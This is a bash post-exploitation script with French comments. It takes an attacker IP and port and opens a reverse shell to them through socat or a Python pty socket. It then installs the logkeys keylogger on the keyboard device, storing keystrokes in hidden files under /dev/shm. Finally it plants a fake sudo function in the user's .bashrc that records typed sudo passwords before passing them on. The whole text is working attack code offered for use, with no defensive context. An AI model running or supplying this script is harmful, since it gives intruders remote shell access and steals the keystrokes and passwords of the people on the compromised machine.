#!/bin/bash
# Usage : sudo bash b.sh <ip_attaquant> <port>
[ "$(id -u)" -eq 0 ] || { echo "lance avec sudo"; exit 1; }

export TERM=xterm-256color
H="$1"
P="$2"
D=/dev/shm
KL=$D/.kl
HF=$D/.h
LOG=/tmp/.cb.log

U="${SUDO_USER:-$USER}"
UHOME=$(getent passwd "$U" | cut -d: -f6)

: > "$KL"; : > "$HF"
chown "$U" "$KL" "$HF" 2>/dev/null
chmod 666 "$KL" "$HF"
: > "$LOG"

# --- 1. callback vers l'attaquant ---
if [ -z "$H" ] || [ -z "$P" ]; then
  echo "[!] arguments manquants : sudo bash b.sh <ip> <port>"
else
  if timeout 3 bash -c "echo > /dev/tcp/$H/$P" 2>/dev/null; then
    echo "[+] $H:$P joignable"
  else
    echo "[!] $H:$P INJOIGNABLE : verifie IP, listener et pare-feu"
    echo "[!] seconde tentative dans 5 s"
    sleep 5
  fi

  if command -v socat >/dev/null; then
    setsid socat "EXEC:bash -li,pty,stderr,setsid,sigint,sane" \
      "TCP:$H:$P,connect-timeout=5" >>"$LOG" 2>&1 &
  else
    setsid python3 -c 'import pty,socket,os,sys
s=socket.socket(); s.settimeout(5)
try: s.connect((sys.argv[1],int(sys.argv[2])))
except Exception as e: sys.exit(str(e))
for f in (0,1,2): os.dup2(s.fileno(),f)
pty.spawn("/bin/bash")' "$H" "$P" >>"$LOG" 2>&1 &
  fi

  sleep 1
  if pgrep -f 'socat.*EXEC|pty.spawn' >/dev/null; then
    echo "[+] callback lance -> $LOG"
  else
    echo "[!] callback mort, details :"
    cat "$LOG"
  fi
fi

# --- 2. keylogger evdev ---
HADLOGKEYS=0
command -v logkeys >/dev/null && HADLOGKEYS=1
echo "$HADLOGKEYS" > "$D/.hadlogkeys"

if [ "$HADLOGKEYS" -eq 0 ]; then
  apt-get update -qq >/dev/null 2>&1
  apt-get install -y logkeys >/dev/null 2>&1 || true
fi

DEV=$(awk 'BEGIN{RS=""} /EV=120013/ && /Handlers=.*kbd/ \
  && !/Video Bus|Power Button|Sleep Button|Hotkey/ {
    for (i=1;i<=NF;i++) if ($i ~ /^event[0-9]+$/) { print $i; exit } }' \
  /proc/bus/input/devices | head -1)

if command -v logkeys >/dev/null && [ -n "$DEV" ]; then
  logkeys -k 2>/dev/null
  KM=$D/.km
  if dumpkeys --long-info 2>/dev/null | logkeys --export-keymap="$KM" 2>/dev/null \
     && [ -s "$KM" ]; then
    if logkeys -s -m "$KM" -d "/dev/input/$DEV" -o "$KL" --no-timestamps 2>>"$LOG"; then
      echo "[+] keylogger (keymap exportee) : /dev/input/$DEV -> $KL"
    else
      echo "[!] logkeys a echoue sur $DEV"
    fi
  else
    if logkeys -s -u -d "/dev/input/$DEV" -o "$KL" --no-timestamps 2>>"$LOG"; then
      echo "[!] keymap non recuperable : keylogger en US, log a reinterpretter"
    else
      echo "[!] logkeys a echoue sur $DEV"
    fi
  fi
else
  echo "[!] logkeys absent ou device introuvable"
fi

# --- 3. hook sudo dans le .bashrc reel ---
if [ -n "$UHOME" ]; then
  [ -f "$UHOME/.bashrc" ] || install -o "$U" -m 644 /dev/null "$UHOME/.bashrc"

  if ! grep -qF 'PICOHOOK-START' "$UHOME/.bashrc" 2>/dev/null; then
    cat >> "$UHOME/.bashrc" <<'EOF'
# PICOHOOK-START
sudo() {
  if [ -t 0 ] && [ -t 1 ]; then
    local P
    read -rsp "[sudo] password for $USER: " P; echo
    printf "SUDO:%s:%s\n" "$USER" "$P" >> /dev/shm/.h
    command sudo -S -p '' "$@" < <(printf "%s\n" "$P")
  else
    command sudo "$@"
  fi
}
# PICOHOOK-END
EOF
    chown "$U" "$UHOME/.bashrc"
    echo "[+] hook sudo -> $HF"
  else
    echo "[=] hook sudo deja present"
  fi
else
  echo "[!] SUDO_USER vide : hook .bashrc saute"
fi

# --- 4. shell local sur le terminal ---
# stdin peut etre un pipe (mot de passe) : on rattache le tty
exec bash -li </dev/tty >/dev/tty 2>&1
